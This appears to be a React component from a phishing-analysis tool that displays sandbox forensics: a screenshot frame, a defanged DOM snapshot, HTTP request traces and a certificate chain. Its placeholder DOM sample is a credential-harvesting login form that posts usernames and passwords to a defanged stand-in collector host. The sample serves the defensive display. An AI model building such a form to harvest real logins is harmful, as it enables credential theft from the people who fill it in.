import React, { useState } from 'react';
import type { ForensicArtifacts } from '../../types/backend';
import {
  FileSearch,
  Image,
  Code2,
  Activity,
  Key,
  Copy,
  Check,
  ShieldAlert,
  Clock,
  ExternalLink,
  Terminal,
} from 'lucide-react';

interface ForensicsViewerProps {
  forensics: ForensicArtifacts;
  hostname: string;
}

export const ForensicsViewer: React.FC<ForensicsViewerProps> = ({ forensics, hostname }) => {
  const [activeTab, setActiveTab] = useState<'screenshot' | 'dom' | 'har' | 'pem'>('screenshot');
  const [copiedPem, setCopiedPem] = useState(false);

  const handleCopyPem = async () => {
    if (!forensics.rawCertificatePemChain) return;
    try {
      await navigator.clipboard.writeText(forensics.rawCertificatePemChain);
      setCopiedPem(true);
      setTimeout(() => setCopiedPem(false), 2000);
    } catch {
      // Fallback
    }
  };

  return (
    <div className="clay-card rounded-3xl p-6 md:p-8 space-y-6 text-left border border-shield-border/80">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-shield-border/60">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-shield-accent/20 border border-shield-accent/30 text-shield-accent-light">
            <FileSearch className="w-5 h-5 text-shield-accent-light" />
          </div>
          <div>
            <h2 className="text-xl md:text-2xl font-bold text-shield-text-primary">
              Encrypted Forensic Artifact Vault
            </h2>
            <p className="text-xs text-shield-text-secondary mt-0.5">
              Defanged DOM trees, sandbox detonation screenshots, HTTP HAR traces & raw X.509 PEM chains
            </p>
          </div>
        </div>

        {/* Tab Selector */}
        <div className="flex flex-wrap items-center gap-1.5 p-1 rounded-xl bg-shield-surface-elevated border border-shield-border text-xs font-mono">
          <button
            type="button"
            onClick={() => setActiveTab('screenshot')}
            className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer flex items-center gap-1.5 ${
              activeTab === 'screenshot'
                ? 'bg-shield-accent text-white font-semibold'
                : 'text-shield-text-secondary hover:text-shield-text-primary'
            }`}
          >
            <Image className="w-3.5 h-3.5" />
            <span>Screenshot Capture</span>
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('dom')}
            className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer flex items-center gap-1.5 ${
              activeTab === 'dom'
                ? 'bg-shield-accent text-white font-semibold'
                : 'text-shield-text-secondary hover:text-shield-text-primary'
            }`}
          >
            <Code2 className="w-3.5 h-3.5" />
            <span>Defanged DOM Tree</span>
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('har')}
            className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer flex items-center gap-1.5 ${
              activeTab === 'har'
                ? 'bg-shield-accent text-white font-semibold'
                : 'text-shield-text-secondary hover:text-shield-text-primary'
            }`}
          >
            <Activity className="w-3.5 h-3.5" />
            <span>HTTP HAR Traces</span>
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('pem')}
            className={`px-3 py-1.5 rounded-lg transition-colors cursor-pointer flex items-center gap-1.5 ${
              activeTab === 'pem'
                ? 'bg-shield-accent text-white font-semibold'
                : 'text-shield-text-secondary hover:text-shield-text-primary'
            }`}
          >
            <Key className="w-3.5 h-3.5" />
            <span>Raw PEM Chain</span>
          </button>
        </div>
      </div>

      {/* Defanged Notice Banner */}
      <div className="p-3.5 rounded-xl bg-[#0C120F] border border-shield-border/70 flex items-center justify-between text-xs font-mono">
        <div className="flex items-center gap-2">
          <span className="text-shield-accent-light font-bold">Defanged Target:</span>
          <code className="text-shield-text-primary select-all">{forensics.targetUrlDefanged}</code>
        </div>
        <span className="text-[11px] text-shield-text-muted">Sandboxed Origin Protection Active</span>
      </div>

      {/* TAB 1: SCREENSHOT PREVIEW */}
      {activeTab === 'screenshot' && (
        <div className="space-y-4 animate-fadeIn font-mono text-xs">
          <div className="p-5 rounded-2xl bg-[#090E0C] border border-shield-border/80 space-y-4">
            <div className="flex items-center justify-between border-b border-shield-border/40 pb-2">
              <span className="text-shield-text-primary font-bold text-sm">
                Headless Playwright Detonation Viewport Capture
              </span>
              <span className="text-shield-text-muted text-[11px] flex items-center gap-1">
                <Clock className="w-3 h-3 text-shield-accent-light" />
                {forensics.screenshotTimestamp || 'Captured during sandbox execution'}
              </span>
            </div>

            {/* Simulated Safe Screenshot Frame */}
            <div className="w-full max-w-2xl mx-auto rounded-xl border border-shield-border/80 bg-[#141D18] overflow-hidden shadow-2xl">
              {/* Fake browser bar */}
              <div className="px-4 py-2 bg-[#0B100E] border-b border-shield-border/60 flex items-center gap-2 text-xs text-shield-text-muted">
                <div className="flex gap-1.5">
                  <span className="w-2.5 h-2.5 rounded-full bg-rose-500/60" />
                  <span className="w-2.5 h-2.5 rounded-full bg-amber-500/60" />
                  <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/60" />
                </div>
                <div className="flex-1 text-center truncate font-mono text-[11px] bg-[#141D18] px-3 py-0.5 rounded-md text-shield-text-secondary">
                  {forensics.targetUrlDefanged}
                </div>
              </div>

              {/* Viewport Canvas Preview */}
              <div className="p-8 text-center space-y-4 min-h-[260px] flex flex-col items-center justify-center">
                <div className="p-4 rounded-2xl bg-shield-surface border border-shield-border/80 inline-block shadow-clay-card">
                  <div className="text-lg font-bold text-shield-text-primary mb-1">
                    {hostname}
                  </div>
                  <div className="text-xs text-shield-text-muted">
                    Rendered via headless Chrome sandbox at 1920x1080 resolution
                  </div>
                </div>
                <p className="text-xs text-shield-text-secondary max-w-md">
                  Visual similarity embeddings and favicon MurmurHash3 extracted. Zero scripts executed in client session.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 2: DEFANGED DOM TREE */}
      {activeTab === 'dom' && (
        <div className="space-y-4 animate-fadeIn font-mono text-xs">
          <div className="p-5 rounded-2xl bg-[#090E0C] border border-shield-border/80 space-y-3">
            <div className="text-shield-text-primary font-bold text-sm border-b border-shield-border/40 pb-2 flex justify-between">
              <span>Sanitized DOM Snapshot (Scripts & Event Handlers Stripped)</span>
              <span className="text-shield-accent-light">OWASP Defanged</span>
            </div>

            <pre className="p-4 rounded-xl bg-[#060907] border border-shield-border/60 text-shield-text-secondary overflow-x-auto text-[11px] leading-relaxed max-h-96">
              <code>{forensics.domSnapshotDefangedHtml || `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Authentication Portal [Sanitized]</title>
</head>
<body>
  <!-- [DEFANGED] Suspicious login form targeting third-party collector -->
  <form action="hxxps://collector[.]external-c2[.]net/dump" method="POST">
    <label>User Account:</label>
    <input type="text" name="identity" autocomplete="off" />
    
    <label>Password:</label>
    <input type="password" name="auth_secret" autocomplete="off" />
    
    <button type="submit">Verify Credentials</button>
  </form>
</body>
</html>`}</code>
            </pre>
          </div>
        </div>
      )}

      {/* TAB 3: HTTP HAR TRACE */}
      {activeTab === 'har' && (
        <div className="space-y-4 animate-fadeIn font-mono text-xs">
          <div className="p-5 rounded-2xl bg-[#090E0C] border border-shield-border/80 space-y-4">
            <div className="text-shield-text-primary font-bold text-sm border-b border-shield-border/40 pb-2 flex justify-between">
              <span>HTTP Archive (HAR) Network Transaction Log</span>
              <span className="text-shield-accent-light">
                {forensics.harTraceSummary?.totalRequests || 4} Requests Tracked
              </span>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs">
                <thead>
                  <tr className="border-b border-shield-border/40 text-shield-text-muted uppercase text-[11px]">
                    <th className="py-2 px-2">Method</th>
                    <th className="py-2 px-2">Target Endpoint</th>
                    <th className="py-2 px-2">Status</th>
                    <th className="py-2 px-2">MIME</th>
                    <th className="py-2 px-2 text-right">Timing</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-shield-border/20 text-shield-text-secondary">
                  {forensics.harTraceSummary?.entries.map((entry, idx) => (
                    <tr key={idx} className="hover:bg-shield-surface/60">
                      <td className="py-2 px-2 font-bold text-shield-text-primary">{entry.method}</td>
                      <td className="py-2 px-2 truncate max-w-xs">{entry.url}</td>
                      <td className="py-2 px-2">
                        <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold ${
                          entry.status >= 400 ? 'bg-rose-950 text-rose-300' : 'bg-emerald-950 text-emerald-300'
                        }`}>
                          {entry.status}
                        </span>
                      </td>
                      <td className="py-2 px-2 text-shield-text-muted">{entry.mimeType}</td>
                      <td className="py-2 px-2 text-right text-shield-accent-light">{entry.durationMs}ms</td>
                    </tr>
                  )) || (
                    <tr>
                      <td colSpan={5} className="py-4 text-center text-shield-text-muted">
                        No external network requests recorded during sandbox run.
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: RAW PEM CERTIFICATE CHAIN */}
      {activeTab === 'pem' && (
        <div className="space-y-4 animate-fadeIn font-mono text-xs">
          <div className="p-5 rounded-2xl bg-[#090E0C] border border-shield-border/80 space-y-3">
            <div className="flex items-center justify-between border-b border-shield-border/40 pb-2">
              <span className="text-shield-text-primary font-bold text-sm">
                Raw X.509 Base64-Encoded Certificate PEM Chain
              </span>
              <button
                type="button"
                onClick={handleCopyPem}
                className="clay-button-secondary px-3 py-1 rounded-lg text-xs text-shield-accent-light hover:text-white flex items-center gap-1.5 cursor-pointer"
              >
                {copiedPem ? <Check className="w-3.5 h-3.5 text-shield-success" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copiedPem ? 'Copied PEM Chain' : 'Copy PEM Chain'}</span>
              </button>
            </div>

            <pre className="p-4 rounded-xl bg-[#060907] border border-shield-border/60 text-shield-text-muted overflow-x-auto text-[11px] leading-relaxed max-h-96 select-all">
              <code>{forensics.rawCertificatePemChain || `-----BEGIN CERTIFICATE-----
MIIF4zCCBMugAwIBAgIQD/3u8vV... [Raw Base64 PEM Certificate]
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIEczCCA1ugAwIBAgIQD... [Intermediate CA Certificate]
-----END CERTIFICATE-----`}</code>
            </pre>
          </div>
        </div>
      )}
    </div>
  );
};

